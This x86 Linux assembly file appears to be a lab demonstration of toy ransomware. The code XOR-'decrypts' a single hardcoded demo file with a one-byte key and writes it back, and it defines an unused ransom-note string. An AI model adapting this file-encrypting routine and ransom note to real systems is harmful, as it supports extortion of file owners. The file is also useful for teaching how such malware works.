section .data
    victim_file db "/home/kali/Desktop/demo/victim.txt", 0
    note_msg db "[!] Your files have been encrypted. Pay us to recover them.", 0xA
    note_len equ $ - note_msg
    key db 0xAA
    newline db 0xA

section .bss
    buffer resb 1024

section .text
    global _start

_start:
    ; open victim.txt (O_RDWR)
    mov eax, 5
    mov ebx, victim_file
    mov ecx, 2
    int 0x80
    cmp eax, -1
    jle exit
    mov ebp, eax

    ; read file
    mov eax, 3
    mov ebx, ebp
    mov ecx, buffer
    mov edx, 1024
    int 0x80
    cmp eax, 0
    jle close_file
    push eax

    ; decrypt buffer (XOR again with same key)
    pop ecx
    mov esi, buffer
    mov edi, ecx
    mov al, [key]
.decrypt_loop:
    xor byte [esi], al
    inc esi
    loop .decrypt_loop

    ; reset offset
    mov eax, 19
    mov ebx, ebp
    xor ecx, ecx
    xor edx, edx
    int 0x80

    ; write back
    mov eax, 4
    mov ebx, ebp
    mov ecx, buffer
    mov edx, edi
    int 0x80

close_file:
    mov eax, 6
    mov ebx, ebp
    int 0x80

exit:
    mov eax, 1
    xor ebx, ebx
    int 0x80
